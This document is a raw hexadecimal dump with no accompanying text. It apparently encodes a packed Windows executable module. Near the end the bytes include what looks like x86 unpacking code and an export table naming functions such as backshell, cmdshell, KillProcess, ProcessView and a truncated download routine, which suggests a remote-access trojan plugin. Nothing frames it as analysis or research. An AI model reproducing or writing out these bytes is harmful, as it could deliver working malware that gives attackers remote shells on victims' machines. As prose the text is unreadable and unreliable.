90712e0f9f2155820a69035e95c61f81e298796dd41cbd5a0ee3aaa77e90f385e78c8888f808d56ac1ce005cd6c6a821104b15331cf2626fc4402142001ec5c56fe528d45b711cf0909b7e5fa024e91aa98cfcf61e8a44440d819cab186f2e68c613793e863771ee6555b6d1f3338e6b2c353f9e9eeea876f091d12788690d408d22cb0eb4e008a242106f0645ec30249ac87c4cd074d1dae85e071faebcfff2ba0ec98b45b7ea643d4adfe2fc543c68195c616c3c3d4cb45c4eea5c91fb5e63421716052720d1acd5b56f0eaedd6a56ec415a5d96caf8e3619507a69e0e5a1806fe9378ec9305686c014fae116eb706b181e1bd5e646a81496b2ff2176133b3d0f649c478d3bb4a7b5a99da4d086f182caedeb8a70a300f5ce0b1d6bc64241df8e51451e3a49f22758aae77bdb51d161016fede5865dc9ff78af356c4e8fdeffa48ec479d6da9af836742499839e79905a2bca9bfe1a627f0fa5ee03f16cc14a197fd8e3f8b10b8f9b491a4167e9731f3919b4bd09a7bf8c3670141e5e7bb93e9460dded4d90a694da646b5c75829d961d84587cd1f832a1a40096c20be21eed015d56100fa8e8233b1ed27acc33210a8fdbda8f94db09870a849bf85d68bdb4daa4f9d789bed3176e2f3530a6aa2b308fb16a9d5424188aa4ed043564df3cc61a2adbb63617181176892e8553df7420a8226b21a39ffb5890634490a8a8ebb97fe6ec19de9d21a7992a947b10df01a8410e5875955ad216f0eb748fd30ee11c6a344f26f2e7b2ed2af325bc34439a3102eb25bbda3ce43696018081f0cee3ba78f3a5d63c114931b122ad537351eee942f2f4d3a1961c2bbeed57fd325dcbe80a956114aedcfc90ccd5cfa71986bf933a3a2027c3fc02082e4e4415c2864bf973b1398b14f81072348ee23008b15ce618c54e4862f13caf3708011695847658656e59abfd180855e26dbe498e067a9606016c59109f29760ea6a5a2ec9fa855d7ee13494a0297b012919393cb405a2595bcfba036805863e9f15571af50fc42b8a38ac1cb8f4dd258cc49771a4db6cf5a5c0b530195950fa09fc3e3e6e0f2f1d655e067cb65caa359ff2a19b3f5026d3ea2ef8ebb251d962849c260f90c4775b201c6156ee6618bf7fff483b99e1e8a045614b3f167456055006b6b8f0718b2989b7d420c85d198634e10271640a4536dbda24967e699ccf5df861f724761b3e87ad7f15d3e8cad34950f0aa5610c03bb293afb1113d8143780a2f24bf57ccd8a4ec3c5f75eb30314a2fd59730e9bd3f2681e4b38194a99fe884ba858c52afdac26d61f24106d7ad5476567debdd3c3f911f6764dd81e4d37d4e5524e6bcbfad92a3ee6063a3ca61401ffb630bc62dfd9dbce33d5faca2dba9660d74c975fac79cce9872be2c28927489eb7cb23b31a8ad9fd104b4cc07fbe94a85a185609234dd23d63fecb81a1ab8dd28effa6a0378d96c10017f4179392290ecdaf010fa28c0b0d62e743c84f03e3601fbe09e6b2d004316fa65e383f8ed907a9112a0067000e016f9695c80c01b9cfa8112297411c117eb445306b3ea66d3e755eb969c6765019579a2165bb110b016274506e5eb8d35e7adac7fdfa6aa8adee70a01bdd31b04c82f401bda0f7cc099b2f69236719f6bc6fffe35cb81c2cd87895ebdc97c26adbacd40aa2d9b2917f57a24a7df2e9b64a4979f0d51eb812fa16461d8ecc402e043f05bacdd70656e247021cb2508423cab8657ba60ebc583b2192f3c7ed4389e0e4799f84ff43c49cbf4d939cd6e2354a79f38a7c6abad7252e8078dc18f5a49d7560ea75437286ed9523f9d848dc2dab58413c782fc7aeb61c243b2bcedcd71d075009f92e6c304a2eb744ba84ebdac1a5dc92bce319e77fd3e6113458f0143262523a67588ea4cef6a2788e9dc19dda2625e4bffba3afb72c877479d1ae61213d749045b33a51cd8026c2ffba010e3d4370d49f02d0d5b4f0bb80ddee5c32f4abb67806dda1ae99aef3e0586bb439968e47f28f62385c9aa30065f0ecb1689379f4d349a97edb9b06ae6bc40240d574d4432a4c5737ca2e8b1b55389f19e8ff28618b25c9ee62efb142aa3d29c4c9edc5460c8ee6332a04d2342fe089a0270227d596a58cbf6a794543e9d0a76a8f8a6aefdef019932d4856328fcab6a65607dc0017e51b434b8fe5a0fc1d449dd3bdb84123ddaa9a3247721f36c67baac6fe53227a100454c196bc1d30a32b53cd254b900390b90743254b77cbb0f910615cf32297e121b08f4c44a8608f649bd05d5453d75c7909b87ea9eae5a49a1e4eb6c6ac66a0888c853f46ab80f105fa034bd46d1b126c5a0c642a69781fa1791a76586ff06b25d64cf265f066d0ac0daf05bfa8f7c65124dbcba4ecdb29da3f2979666d26e09871685e23272cb047d60616890233639f6c40a000db8dac772851ab08146c9e088d3a90ea5096bc4b8c9c5d6eff103ce1afe28c95661d312ff774903e3b5ba35f28315a04f2d6159230670cc7a12a8cd531c2dc5fb85f0b2a0cb70cbc53c5aaad5e832d33b157a31749d69f9cb9411c9530619ea1e952d09f9b6410adaf5c3a8c170e61700a9efb10df9d2687b2cdf3bc4c5537bcc13b0439202929084d160855251dd05730b0e688811d95a569fc4b286e73034341e4b392a3c12c755f4f579fa90d53d4e9809dbae08659c8f9b0b979ada3aa6a37b192215c0f387b6007849eaf3b55352db115442dd87d393051766e2d28c3d71b857c14238d4352db14a2a29bcfa8819db0029fe0e48adb9c4001b3ab981892699f30cfac7bd983253a3fc1f287930d66e1b1663ba57904e964e34f7d3db7a67fe644cc3d6ec57c9f81c0c676c29f05daaa1a0db43fc5306415e8f88a5408ce18960292e74587e5bbdc4cc03d289a6741be40b0b7bc23d648f428002ca3e9e8a9b262439fb3ad792969db31fe897f3ec893eef2e5695de2263fec4a9980bdbf5290cb641d6da7845c6e2693f9aa49e769ee82a84098c55f1c3da11c4f3a171d3998e1814e1b5aa2998867b4132406aaef42f2dcd6ff88a1b362e8eacd10a9f855531ef9c001225ef8060fa4f58deb1c001a1b3f184e3e6bb986a8f56102752c073722f6f7ba68053cc8c9223592f19f6d8091be0301a11a017e18d57ba773ee51d9766dfa0892935d217c69699f5454328678b842222fb0fb812bfc50c45fc59080f140c0e900de5f7eabda4876141331f0eb1398b99af71fb41a09889147a9ec60482f5ca4066271291e9b39b1a939a545880ac250c0b97350f5651da47c5318c6395f14eed8095d89317ad4d52163338d3c6a5f7718399ac3769a4f68dd1f97cd8543ffc0d8c8374a85f288edea1cf9c814b4d087678d0b8d01cb34d8b18690b0f9381cf9155a31b1655f7923fb14873cf9f82d54d776b901e245912629ecda1b2372af57559df3620863df97efec208cbd05318f02441262ba594c24b6c1aca1804800ab6dcfac60fd16627b6c718de6550d422ac676535a3fe3189dbde3fb4cc2f385bebb863b847a557076e0f379b803776d137e38b58ff79e6e2c1215f281a2fefaf03cf7cac0ce1f337bd395aa8d7f1ca5dd33ab9ceb0fc856dda193dbeb929edaeb79d381bf2f5803803874dc766295bff0170c9f2322e24aeee973639e33d3bfa2e27a459aae4ef8bd21c4c162c87c92b3930559d7e79985debaf0e7850d6114cb25428602168524229ca3cfbad5725a92173cb9ae8e862a30132208a4fd86e65db920b39d339532159f94a8bd1f43e99ea8f45384f9ce974176da571e2bec328be22748fb54fb4ddf501d9937f40b79dcfc4dc859544081622d864110664f247755cd0d4c75ed1c908349477d67f233c60bdeb984216ac25a7a7e7ef096c8e7ab898a5b45561eec047b388b95333a525d3c1b5d3144146ab5e30e19dd40855a500dbd08b5cfb28792b951f7e5447621d8275b360b9eef59ade231a2c4473cf1bf59bc3ac8df9baff76e80029ee0a8a12752d525018520d845d75adf2fe3f1b036d7cd60b9278579a61b0c92be24e6777fd8ba32e86b9128094b5a5a20200c96ff637ae5fe1b35478f43a54b96dfaa4e8153a182e26b429c8a83181e16d582582f4f5f8fd61e950ec54233546bd28c09254f3543873a2b31f9050683ca8db18b3c96f48c48c12674e9979edae596f3382223e94003c7d5f06bb14503ac4b93793a433ef8163314f73c57d829626b1dcdb43ca84b94a079dd2fcf72a0bf565e0fdd4a586db11923bee45e568c5ac259449f3cd598aeb4ec6057eb3edb0ee7553cea0b6ea946bc874d6c180c821e208a26303b7f49f71810c65edc3f721b9928b85a8d4da0c62ae4718cc64b79aaf6f836c71490754ce89d65c8f0a60becaa490d623e563f31a551b3b155ed009d599f8cc66615f3a00295fb781c554d6df06f717173efd8c0248c325cabd378a72e11ff1debb383c6868f1bcb5f8dab7a84af34dd1f6c63ccce4f7083d03f7a4909ac55e40725e781b754bffa9cb6212358a7264fcc301666ad904fd18e238248054859f6c782c0ee82c0aedd52357bf52ff276e940c108a2dce6a0fb8fe64cf4359ac669ccb788c65a9f12f59f7caabc4dc96eb3e1b2e1b88e409b814fffbb1b55da36ce17db2d53e1ae72569bcd53139e8423e7b8bfba590c3a69d999e556ae4022625be77c20f29de8d014d34863b2e69d4047b858735de1b4d2fee8cdb2ec5f75a7d5606ce85f30ad368adeeb29cdcd06699bdcca966eda541cee464c06afddd18c990a493c569bf5fad2a76d567555ded3a88a6fc561280e2e6101fee9c15b68dc835f467180bc1f4633201a2a8abd80db0736e3c3f879d5e121ddbb0d18ce70d3cfdb91dde5cc162a7c5ff274dba0f2b2b8aeebf0dd10ea45bbb60013f2e257bc37cb9894a734e48f048f178a562a84afc8421761a83ad4b945a0d63c27a37ffca54960f7c349ec369a1f36edee47609c479d83371fc5034e6ede8beea1fa56997f6b4fec1001ae303b6389e7a9c676b448fff0eef32b9b78dd9f6d1cbc2e5188cfb063292c39051724ba7da77929300772be1219daf4b6834d264aa370052060ecb70521aa7f0e78c252eae1792df34a8be250c4426b5df3e8d4fe1b21b00ae2203c8959f2c942b1846d7e3cf849a9c59bd4db625b8003db2ff1ce70ab8c81b4c09bfc80e10492eb2cc0990cd67c139e576d84a840ead85bbafc15c1380c2575c4bcf938595298089e254f954f1ec81bb30bed9061304166529dc63be4b3cebfb92f3836a200ed8ceefc7422e361fada9484a5bd9c62eae9cc971495e9c9ff62ecc4f16fc05bcd7c3480dfffc3d444f5e0a57887de95e8f84df37d1adc4ce10c5a818ee764d0dbcdde9533d70bec2837e74a30e2b04565e27e11702de60ee2ace7253a92ca1b51697dfb3f20106e4b2b07e8e3d7b1d8e5772a3eeca0e948ef0702347077c716f01e235354a8b1309529c46eafba9c13f7114b772347a98e26acccbeae88a7456797cf40836588f45c3d416e5812139ba9e099c8481e63240f440ae34e30c25c1264b4ea9f3df9ff0632bd61acba0e9f67b5c9e4d0cb35683ba74dec85e9a5c1bf8df707abe74fa6bb247b5960fa9664604613a1cba7496a51a083e4d0fdab1c3c83baf73d726b2153d308729188cd1405be34b71449b71b786a95e9f206b5c1d058e9f8695c963e228ef35eb4af6b5352f8164b7f3952bb7fbb6f47de32e069b6951e880e151b49ccd62769af05ff8368ba5dbd94baeb743bae6bcf7ca8e3d07b29bfd9542a1f1c1bc2d890ff5218c031576759ef062f777f75628d8f8501ebbad751508e43006ba08ef7911c8c11054b3e967ad7f61bb4b7eda060691b835763a63b88a2df89266d1077b8cc7f72cbfaf40ba1af231668a601cfad63350ba7a5a8237c6d59e4a4b9062843bf3f94d5a70d4df2d06ece2546d4703d15fa8dea4c9aca74136ef62eda42fa7c57031bdec6d1698e9ecb5bf9db77a54ad9e04251bb47bad35138d3370e743b19af3c70ada5197ef10eeafddea501e04526bfae9ba42ce5535bc7c77a7c8b7d0ad5e632831d92fae3b45b6dc6c1f8e3b2df35366143343a363c88cb3048caf80e341e10d891bb5252e4545cacca7071988c8385e5a1ffd0c9b54f2735a80565bd57eebc9fdc8958b4cd414e54000039cc808bab446f7a34086c019fbb5e4e76936cf89349f18f8c30f9bc03771767ef8c24138946f9f72f3563e4ccd4623b7176b95f437907a27bb95e98b68a4cb484c801d46775f493853cb6d9e7fdefd13e3e44993df96bb1dc5b7bc085490f3d45d05fee396129853c61dd77d478eb65fd4dd2e2e069b320d6db6845426edffce82244a0fe00febd18e82d9492c82616c4ccf953f45663c68a8caf1406a205df0b635b239f00562153fe9bba80167a244b46dc00fc5481557a70ec0ff8c210378ace8920416a0298be1e5a821ab000f249747694373714672d6d8e5cb403a11df7fdb6e906db306dc87c29f9d757e927d170deebb9de0f18cf5d0596edbcb85e11abf08e5b20f9c00a1b47cc4aa742f40fb885a91725de17281f5d7c82ee326ba886ade5f010f943b5eea141f29bbc359686a8eb3f06ff4edf81f7455dcbc218207272ec1cc7edaef85325e4b945149f70ded430ac08fce8b4d40dc0dac2627efc8d14a0132bd6c5ad3628dd30e6056aad384104f155ee94a0cc07a522545b8fc79e10de30b01b060b93718671b647e94773a894c689efe230fdf7bae5859bc9f532c6c38f73decfe7a0276fc12ace3636c0eb1adcd329b50afb51c24192b031b821835b2e686e422b25a54b1b72a399a1720b27f1e7d1522fee1cada382dc9c1faf308209710f3a8bf544924f75636524245ccec97e96af5ebd9fcaae7f0059864dd9ab6b2b7528389fb00ff09e9cab92223190693984eac3d38817040a17e108e57dcd60ecd5e2ddb488ce9ac3ab95204379b811d1b8a12155da4d22cbf2881475b9b438f699bca71c5b8fbe1c94e78ef82c1bc4409a104debdf71166547e49376600eab44e93d437afe65195997ddad56879f212bbb8397edeea03c7faebe65c87066b55405329ea797cbe88b4ca2833dbe96fa5137e31b47f38b72ac0fcc2308fbd2b588dfdcc0999a0d07f0ad127d9b84e8ff574b6e3593042d2f49ed904e7ba67b45b732ab4c6dc40f18442622e1e81858f2fe9b490751c81fe3241fc0259515bcb57793dee89339caf82ebfa6123fca946dabf7f5c118b0b650ca09955f7327b88cf99b3703e86107985d54d44cfa152e8c9e0916c1847573d9ee33ba02402df410da97f09140939d61e27856f05b6bd314401cffdd889ae450936428e488ce1c54583e24ef715c1c577e49c82b5f017e4e57033b3a95d3c65acac6e5b545e5f924326993855d842a286e520759fbc75e2b9678c3f3fd9497b2364c64670848140fd06b7201f376216612725b17ff5e91481cc3c3a9eb04770a76c29622959845298d09163e7f8a0858e88ca33aac8f2b18118a29793f344407c3fa10b414f20e4ddcc351cee0e78b7a140dabe320aa52963028226d79c8c0fb3b3b4fb20bff0a11200484c675cbbbe05b14d7dd3bf802d03fcd6f2fa5141df18591bfa2b98dd64bfb37b3c7aba257fa7df4a69257e35f69d2e1d0f6a2124f76ece02bd009efe870e04c1e4d033c59528ad4b533c2648a238b7a7b1dc8de9f05ea2bde344fe56aa1f8b1d3ef3511a39c64ed1bdc9fbf77b6045d9473e95c539d3a10e3de156635037b4b68a7dea0260016c379e4ffac60cf82fa256ba9cc7cb786b9993b5cfef4414926b845699d127d3e787abc1c694f947c668f3dcf4c0082cabba060934875ec4e675fdc8bf42cb9bd9c2c3a42dae53a5deb569af03bdec4dce2fc1b18f7c323e78d2f3c879751ec1ac21418a779c61caa259f09c132be604b97ba39e9e80b5eefa3160784c9ded268ee9e586872515df2e1864693a0cb251cd30630fb1d77eeb14072af0526ccbe387480053940a95f3f4b6a232ee3760dc397dc146d03748dad4161c67e0e3d1c123d6684464dbe59181af9d22efe145ef9cb9f722c271ee30a5c987ff95b5b87ebab0ed100b8d0ba83c37df4d6225bb9642224d4cfa211149cf5be32794d3c3c379c2e896a581d8364c80634449753ba980f608c203e703a7a65f721eaa487b5cf11cd6f294ff91b633a08e12404912f03af971d1cdb381ce1fd102414b52a235b495dfb7631644da524d068908d6eafcfa73f26086caacd2591fe006370ea5501dac27ff325a78067b9ee59652a05e8904decb7219ceba2744b0546ada587290363c4b5af950d4d64a72478f5356725227805e50cc7b714cf8f43e40b03ba7f867069482d164b54f3099e671a5803c881eccad2ae8aea6280b174863e271f77e94e1ffea81811ad5e60e8b87671f592a95b3264e94415ff66e8ab22bd2120b15a10bd99f8e0d74852e41dff820bd68635f84a004346944e99f9ca97f5cfe8fe1d949824b8c8918b57614c15e0f71fd9d84e5308950ce52cc19857dd16b81b3bc962db9cbbd8ea87e39e7fd59bd78e947eab77e0d16c58d3fb2530d622651b8ecefad13c7ad5bb0443720d7eef9ea65c763d1bc7886029f926071eb1debacbfb0fb551ab1d704cc82d957683c2d3d57d94c7752caf77632968b7e20ebd3fc56510657d630a227f0c9202af2870e71c231e252ecc2cde1f98f4110d6af64d4e1a88552be73e68f6283ca1a2a817b3149eed85818e499a65c19ab244bc7eb61db5ac35ed55faeca0b01664efd1f2da213274535bc7e41e1254f5a50824b12bb613b27266dabe3bd62e2145b5da0cd726d122a6281b1ca86fe9df66483ea1083573ee3ed4121837d4cc85f0eee2c02afc46e7be8eda706d3467c7fe6ee7fe5facaa9e6dd1249cfc92fd403a9cd43b9944656afb643cd54663281c71eaab46e2c63df9c0619d80e156f885ff9b02b676de154024d95345c770adcd7325468597b44d6b3d29bed4fafc002c7a987fd1bdb9febe59e350ce37610562d99286604b171ae985d20ff53c64a39831d93137cfc76810ca2c671715c09b2dfc52167240be4a6cdbc905ec95f8604149cbc9cf560f004c608306e2f90bc703be4d257c885bb7c6375a8a988431b1dde742064f0fc4b8d294c8b34844e383c1ca393acadf1c1da8ff9b13f4c70ed8208ee2c0670c1aed365ba0fce7d874fcc0addd9d74077e9d9cb230545ee35dacee2605b29a7f863bc58e0b2423a7b3a2326563210329a492cabc9f44406de4e8c14fb78d9059dbc286b6b27f01dbdc947caccee3675c19f54118d5ea0b98740e9102d2459c63811876d0a0ecd9bd55edaa60e4eecfbdef30a9ac33f952402a62c97dcb061d018c0fc6ee2760ca2eaadcdf6b397135c7875c47c36852076d607d4aac060812f601ac6f73dce3c7f50bb4aeb5369ebf65e14f43078de0dce84b270a743134db987b17710fc0d863a4791cee861a0a5568be977b1cf3b2e1eca312542df4324575f8c3e4661ed2b955bb7c48077d4952193496265740f6de6955e935cd67df798c2f77b645cb33ff297d90de4eee66384f8f5eaf5c761cde263c60619c1e1c09995d7799cc74689071abc4d310fc08f6d069cd4aa32e47beea8438d6b9aa9bdc100671c2e1b17e2014cbc782e2c7972bff99785bd2e4f2af6e6d7f46aaecc6958ddeabb52b4e93ca67fd2741af101cda966e83f822e29ec180c2bfb704a666fb9dde2ddbe8d389e98c3e3d360037860fce71598fd3444d133c21feddb993371f5f704d4ead8a116fbd09550382b62ffa1fa179b8b6eb1c9611f16a0bf4ec475aa9fb951c19c468f94fd1c2d3ec793bce76a50969ff8f39214de1f714633bbd8aced6b71034b95c38a640c51289794c4191499f9bf013e5aa9e9928b675e96ce2358b14abac50cde601ee9fdba355bc0d48900ded3bba6d8e761a5b36ab0b2480422889d0081a3adccf83cc621fbc5e110c2d2e9a5d9dab399a324c7d01ff7dac85933351e552b7b0fe2132b319b630f93e642aeb2af777627148aff3ebbf6dfebdd1985e91cdbe9a4b47bbc7e189cfd4a9de568d974d13b596f4b5c10a01b487e1191b8e742aa752ae89147256501e30918f7be67e03b4f4869c55817dd2358e438359b7cd22fd1affabd78518b91f3248e2d839ade3dcfaba45ab72519c5fcc6d7db4bee7840c1b2c23834c7d8079d42c4ff6b8b9291e0e5773b41b716bd6ea94ab8e8934eb81e9326737a06b320b1c98919f8654b0c6e2ce3b792f42465f4506e54900a654233b468ded6bcf7b99fe25754c35cb1c67dee159d9db365eda9fa979115b668008c15f3564401b4b74e082355a596b776ab5c14a7d998f844a48c8e1bf5406dddf8b56c6641dbf0cd68e7e98a2e8d2b829ee342ee65ae34c23b9d2823768fbd80024db4970abccdf91b0e92ae2fbeb2822633ee42dc7622e2ef9c7b0b60dcdd181e2271cef8e0a4a161c700b17c40fea711edd36ca33513d433f109c657d4b610be67f5b17ea714162dbf40e74576613a316bdc75f3572c0dc12fe3c7487249d00c5afaa4ad3d854ba763dabc807da78996e6585b9a6bcfe2956ee3691778ea9d6ee8027e309b066d67116d0c2eafcad749a4858c362aa0eb6d56a28aee9a2bdf22b401c6361d8d13818dbdb2e220ecddb361b622b3f1577fd50722b4f9523378249a4d5968bcf6214c9837991a576e07b556dedfe9d1e7613ee28e1edfd080c943e518582fcb90f41cc60e74a22953d67a042fb24b522db482529b6348645c622dda250b3506ce19c9f2cdb202a454db52f3f73be52026726147717f70b7d3872e4c945104eca84d4f652ac71e87c4b94470626784c6654fdd968dd81d472745d4720341d9307e436a92b29b1a419bf024b70700a0d2c1133c3911f081ba1bce9dd0b74499fc6da58e19165d5e452c8469aac1e2a2e5687b98e081f05e73122b7b4bac513d7ec8a940c648b44bba80076273189858549b283ab363d0eb9e8962462a24f1bbd96db00922744e9484f09aae326461e57da8679c14d41b1986f33682aa70d91efe6d0dd81b65d26000463b8c3429c8f93f0801d71ab1123611b93e5f3a7a278c363c6797957950849f39974d6193ab8fdef30087e1fc96db7c3b78c11c4be00ae617a04e27c74f5c83cc81a95a5cedb752118622f6196fb9853fce4897de28494d5d94763cacd6e8d97892fe00380a2a34fa194882958020ed4b39800b2b01306475074cca32d398589d4ca1686ee3a11b1f918b89948927ee3a097f737456cb43e774bf1913c7c7431b911071a4c4bd30e96e28f0d786d3826ee76c53cc875f5b827e203a8702bba2b4760d0f22f58e56180744172384f5abc11d833bf1201387ba60af29a88da9161af85a07eb4c30deb23732d60e82d415d6bd9eeae750b9284be41c5efab738a1ca5702686579806948960390ed4c0ca7d219eb1ed0cc479c4c516589783c784dbeb284e0d50ad2856b81737d1012273e69f91fbd05fa0ff37283cb44d10f41c44665ced2c42ccc15c365c05f2fbd5a7b99975627c99f5ba39e3dfe1a0b9b6efe4f9d859d33f7a5d9b080b1b7ae7d026c7d0c52ec3dc4a60e5cc7fd7c0faa209f46d531611d88635e8da5b6cbff371d6cdb40eaf94f44a90f5ef96d54a1c148c140feb739837c52c56119c1fbe898ab2242972e028faff901de8679f2d83d3e8094453a80f163dfd6218b72ecbee21a2770d4d0fa9cfe524e8d918d59df5e0e260686966e021d93504fe98e8a5a3113bfdc29a4732ee00c31b6b9471ffe1bdd91625ba0dc6314e2f7c6d14903995692a5730580894c6875679680d71d4470557c76cca1317fa1e3a437c0bb133b98b2b1934ec5ae18dca6b69f3854eae3e9156ed84abe3112abed69eb79c1251126e14b9b3924ee2453d7f3b216d22649464155a0591fc0af92ea6b810e66cce1db14d168161fc7883e994c7f0a5ff401e3f9c1f08439e4333f553c1b84b308ee8fbb2d13f8ff8247aef5b1ca08f1028d70840ea0aa923a1ed861e42358b7ae207a156e333d0f1aed6534b9a4e68b3922d4586598b710128e901855c95fa47bca65bdce83540d78a774028838677d6075eb1ecfd0ecec38650ccc45a05edda1a8e414056aa4db23404ee8fd9411f8f78930ca9713d6d465f95d0bc687bc39f27c2c0057a50e92a0c95e4f4b37411028a07ae76cf3260bb086ee656c033a3ef5b89fbc97996e06243d3f33851476afd328da79f62d1e95a27bf451b943766a50c238ad4b3dece8f4049686494642bca8ae162c69c48c8b9a89161572808b691c5638af59d2bf26b68af0a3adf17eed396890cfcec6e8aaa42742a5fe92073d66d3e2b7baa8f6c473e2f48e9c9e0f7b0b7f7f37399784a2937cc6dcd4871724b2d33a6be15add1908800c8cf92fde2d6fca5a2f55e46a9e2e19ce040739500b33100cce91b6da78009e61b066448dbe4226cc2fb0ee6a027112d9b2e200bf7d197889b3d0f945032488f614a6803b3119b368322825ce5b235a69a6f147ac2341195aa5f3c190eca877c3c66508d99f968d6a350290dffb9da9c4fb4f60b368d3aaa809fc127b2a0bd8eaefb1fa4ccda9d168065ecbbd4766b173e886abce1cf23053a4855e1d6e2f4fb2bf9c07c56fc6d2f27acb2ef8c2f012cc2898b56f32c02a70c5009dd8e35797717ffdcbd233256161ee254d1b1accd2b6133a5fc376babdc4c0d5811c89deadaed2ef047c6364a690fe998b944e996fcbf8c237dbeebf6d764f713a39e8e01efa008b949b13ae7e04017bf1d85071928869984bf78f6a3695586492efae813ce2c252dc92fb8db3beb32cb78a5b057ef9f6bc3524e462c121f4c6c3b29083979c85cfc73e8e5b2500e9785eaf5ea409134606c8a50f1fc68571303807ac06ef9bdc138cdaf1d545b361b25ec793a30c765de9b4199076f41da8ae675a21f321a4060eee1fc25bc992561ef6c1b332747f9b4517c316dd1d68b950c671cd3ea2e42480a0b82901058b355b59bf72d65f6eb33f3f49bb9bef7b514b908255051e8385386939423d47625377cfbe22f85b904dc6029c207a65288e98ff01f215c12507ce986939be440458c000f9475cb4b4704dacb7656330bd06485064678fc603392ecf35a512d76382232fe2889b8e0e7418e9264c0ff1120a56c63b3c08c0eb703464c1c4dd4ba417d11ddec9f67d814ee0c5df50c173b2634c8b6b18cda4d86047a47579847bd1490aca83c8be538bb02f4569d2e200daffd04a47089bbdb0acdf3d2e2772a0fb12d37485ec8883c1253bc84457f3670704b9ee898e978a5593b73aeef92f10f9020ec60cee25e327fe2055c0b29125f72ff67d28b31bdc778d74bd1c39ed6bf2c44ecc2a61ea5f742f6a0c1857001c1b07e56db98c6db1331bdc727a7dc98d2a3f5c5f7cba0c2fc783155c08e4eb337138dd2fc43c6aa607722b0cb90f6afe3f1226d31d5237851cc1dfed5dbc055027361094c50c67b7be979e07c9d5a3f698a9871ae81bcf53c70c611f5de85ccebf2a10cf7016e10483c6125ae8c5660f9269480ae025af71d8923d9ea95b20abe3c71e97e59b8278271dc5722dca6883ba3fc70dd206fb555af8206b03180dae4538642c1d88eea507d8d2cd3cf435660614f87f10cce23786e9376f51e47e4d3202499fa1e3fb3e2e0549e6ef0880fab18dd3032d55b32d484217349380806a72e46888d9b57bccc8aec8be2bd30007367de32d69c5b950fc82ae6b32bd7f512321c7bac127ffeb31c2d52c779ae836304f63cf89c2ec612cd32edec1fa2a7f9c128b6db5f064457dcc9817640a1d0edfce1776f20a4f531f59035345f668bea438eb47e0659f0b1e4180090a81653c7e5303739a6f87b51bef9491d498d1a51e9802d12842f5dd845a3dc54a82ee140424e26c6025939a116092a30a7ab03745b0e5ac7983b0c4537bcda2393ad2d6d24dc642c3e1aa38b4b83679722b97469f3f0e28d1aad08daabbdf3f0335f0abfd33b9bdcfc8f95829ca6064853ad2a2e856771e0c0c952369705cdef3b919340e086e073ddd9c9896e783f3610cb4ae23aa06d2bfc281bdf515696bdf1ae28eb7f8cb1e3280ca948e3d2c89b1ccb7f341fefc7ea193c7477e3d81df3799a685fa2dbd1aa8f7c6d164fa73f44c306fd495979b5b03ad9e29995ab445a89ee792b7cbe5c4829204d3418a29a6e5bc1375d575860f01fa456d8efe52b50f64f221b9372551a5d491ae31660c4928176d974136903e8cd04779424a9d09dec08654ba8bb880bdde1120039f89d38eccbac4436bf382e4e73956ee3b2be95a6659cb96412b14032b5676a321173882ae645390237ced2d62eeaae20f3f52e4c164ce074e0e2cad94dd4c189f19b88991aebc2cffcf522b373d7644c026fd890e0b652261af984a1469ce004fd3464b3949812bc602eeb055c72b2e645a3ace286d9e7d924b0604043e632a3ca026699de5484bcfa7001d5b479761a99eda72d51c9de7345ce00d4c35dfb044b8907fe1bbcb58f5b207aa748746af5e2837116c2f75d4371705986868f6de4e700fc56b91c86c1d3cb4c5c3c9016c3ab6379895fd56adc7c0613eba6d239df1bc48e218233b370930b9dd78627c87c89a4237b00f51b12f75227807372b3204e67138359a647bbe5e8f2f9114ca5518d4c582de609c2958058ce5cf095d5233abf344648bf2a91aa61cf13d6fcaf526e8c69d8a0cccd3aaf850798bc8802a2896a737eb791de6bf660e042843df3e8b68fca1065c5963fd128c7e8f1e9971f5a9f9d7131f075a98143a4de0e456eee823cf6988192a4e372172bdfbf7301bef7d260bb60126a1356857d698df62b5e7ac5e02b4bdc0f1eb22d953b95fa0c6b802f2235bbc31d04d11b46d2da5d8cd6d4f2fad666b3c0060e809000000bb930200e90602000033c95e870ee3f42bf18bdead2bd8ad03c35097ad91f3a55ead5691011eade2fbad8d6e10015d008d7d1cb51cf3ab5ead53505197588d54855cff1672572c037302b0003c0772022c03500fb65fffc1e303b3008d1c5b8d9c9d0c100000b001e3298bd72b550c8a2a33d284e90f95c652fec68ad08d1493ff165a9f12c0d0e9740e9e1af274e4b40033c9b501ff560833c9ff661cb1308b5d0c03d1ff16734c03d1ff16721903d1ff1672293c07b0097202b00b508bc72b450c8a00ff661883c260ff16875d10730c03d1ff16875d147303875d183c07b0087202b00b50538bd5035638ff560c5b91ff66303c07b0077202b00a50875d10875d14895d188bd503563cff560c6a035950483bc172028bc1c1e006b1408d9c857c030000ff56043c048bd8725f33dbd1e813db48439143d3e380f9058d949d7c010000762e80e90433c08b5500d16d088b120fca2b550403c03b550872078b550840015504ff5610e2e0b104d3e003d88d551c33c0534051d3e08bda91ff560433d259d1e813d2e2fa5b03da4359895d0c568bf72bf3f3a4ac5eb180aa3b7e247303ff6620588b4e405f5a57e31b8a074704183c0273f78b073c0775f1b0000fc80346142bc7abe2e58b5e2856528b762c46ad85c05a742203c2525697ff53fc95ac84c075fb380674e78bc679054633c066ad5055ff13abebe7595f8b4944e30d33c0ac3c04720c03f80117e2f361e9e89bfdff2c017208740ac1e008acebe866adebe4adebe1508b450852c1e80bf7228b55008b120fca2b55043bc25a761089450833c0b4082b02c1e8050102eb0e0145042945088b02c1e8052902f9589c807d0b00750bff4500c1650408c16508089dc333c0408d1483ff1613c03bc172f52bc1c3b108ff168d5204b001730bff16b0097305c1e105b011508d1c82ff56045b03c3c30e0000001e00000000000000000000000000000002000000e99702000000000000000000000000000000000000000000010000001e0000001e00000031980200e5980200a99802006022000060290000b0240000c024000060290000b0240000802c000060290000b02400008029000060290000b02400002010000060290000b02400003014000060290000b02400009016000060290000b0240000601b000060290000b0240000b01e000060290000b0240000a026000060290000b024000000000100020003000400050006000700080009000a000b000c000d000e000f0010001100120013001400150016001700180019001a001b001c001d005d990200699902007c9902008d99020099990200ac990200bd990200c3990200d0990200db990200e5990200f6990200059a02000e9a02001e9a02002c9a0200379a0200499a0200599a0200629a0200729a0200809a0200889a0200979a0200a49a0200ad9a0200bd9a0200cb9a0200d09a0200dc9a02004b696c6c50726f63657373004b696c6c50726f636573735f6465696e6974004b696c6c50726f636573735f696e69740050726f63657373566965770050726f63657373566965775f6465696e69740050726f63657373566965775f696e69740061626f75740061626f75745f6465696e69740061626f75745f696e6974006261636b7368656c6c006261636b7368656c6c5f6465696e6974006261636b7368656c6c5f696e697400636d647368656c6c00636d647368656c6c5f6465696e697400636d647368656c6c5f696e697400646f776e6c